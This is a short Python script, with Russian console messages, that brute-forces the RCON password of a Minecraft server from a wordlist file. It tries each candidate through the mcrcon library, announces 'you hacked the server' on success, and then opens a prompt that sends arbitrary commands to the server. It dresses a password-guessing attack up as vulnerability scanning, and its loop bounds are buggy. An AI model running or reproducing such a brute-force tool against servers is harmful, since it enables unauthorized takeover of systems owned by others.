import mcrcon
import os

def hack(ip, port, version):
    os.system('cls')
    print("Происходит взлом.....")
    baze = open('baze.txt', 'r')
    hha = baze.read()
    hhh = hha.split('\n')
    for a in range(len(hha)):
        a += 1
        print(f"Сканирование уязвимостей.... ID уязвимости: {a}")
        passa = hhh[a]
        try:
            rcon = mcrcon.MCRcon(ip, passa, port=port)
            rcon.connect()
            print("Успешно! Вы взломали сервер!")
            while True:
                command = input(">")
                rcon.command(command)
                print("Команда успешно отправлена!")
                continue
        except:
            print(f"Not access ({passa})")
